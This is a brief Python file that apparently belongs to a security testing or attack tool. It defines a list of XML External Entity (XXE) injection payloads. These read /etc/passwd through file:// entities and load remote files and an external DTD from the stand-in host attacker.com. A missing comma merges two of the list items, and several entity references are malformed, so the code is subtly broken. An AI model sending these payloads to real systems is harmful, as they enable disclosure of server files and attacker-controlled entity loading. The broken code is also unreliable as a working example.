# -*- coding: utf-8 -*-
XXE_payloads = [
    "<!DOCTYPE data [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>\n<data>&xxe;</data>",
    "<!DOCTYPE data [<!ENTITY xxe SYSTEM 'http://attacker.com/evil-file'>]>\n<data>&xxe;</data>",
    "<!DOCTYPE data [\n  <!ENTITY % xxe SYSTEM 'file:///etc/passwd'>\n  %xxe;\n]>\n<data>&xxe;</data>",
    "<!DOCTYPE data [\n  <!ENTITY % xxe SYSTEM 'http://attacker.com/evil-file'>\n  %xxe;\n]>\n<data>&xxe;</data>",
    "<!DOCTYPE data [\n  <!ENTITY % file SYSTEM 'file:///etc/passwd'>\n  <!ENTITY % remote SYSTEM 'http://attacker.com/evil-file'>\n  %file;%remote;\n]>\n<data>&file;</data>",
    "<!DOCTYPE data SYSTEM 'http://attacker.com/evil.dtd'>\n<data>&xxe;</data>"
    # Пейлоады с external DTD
    """<!ENTITY %% xxe SYSTEM "file:///etc/passwd">
    <!ENTITY %% remote SYSTEM "http://attacker.com/evil-file">
    %%xxe;%%remote;"""
]
